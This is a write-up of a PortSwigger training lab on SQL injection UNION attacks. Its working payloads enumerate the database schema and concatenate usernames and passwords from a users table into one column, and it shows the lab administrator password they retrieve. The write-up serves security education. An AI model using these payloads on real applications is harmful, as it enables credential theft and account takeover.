# SQL injection UNION attack, retrieving multiple values in a single column

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column), you'll learn: SQL injection UNION attack, retrieving multiple values in a single column! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204060909.png)

**In the previous labs, we found an SQL injection vulnerability in the product category filter.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061104.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061117.png)

And we found that this table has 2 columns.

Now, to exploit this vulnerbility even further, **we need find which column accept string data type via `UNION` clause:**

```sql
' UNION SELECT 'a',NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061310.png)

We can see that the first column doesn't accept string data type.

**How about the second column?**
```sql
' UNION SELECT NULL,'a'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061405.png)

**It accept string data type!**

Then, we can enumerate this database much deeper!

**Let's find which DBMS(Database Management System) is using:**
```sql
' UNION SELECT NULL,version()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061652.png)

- DBMS information: PostgreSQL version 12.12

**List all the tables in the current database:**
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061753.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061806.png)

**The `users` table seems interesting!**

**List all the columns in the `users` table:**
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204061932.png)

- `users` table column names: `password`, `username`

**Let's extract all the data inside the `users` table!**

However, since **we only have 1 column that accept string data type**, we need to do **string concatenation**.

According to [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), we can concatenate string via 2 pipes: `||`.

**Payload:**
```sql
' UNION SELECT NULL,username||':'||password FROM users-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204062235.png)

**We found user `administrator`'s password! Let's login as that user via the `My account` link!**

- Username: administrator
- Password: uin0c06mzov8uvbvfbwk

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204062340.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-6/images/Pasted%20image%2020221204062351.png)

We're logged in as `administrator`!

# Conclusion

What we've learned:

1. SQL injection UNION attack, retrieving multiple values in a single column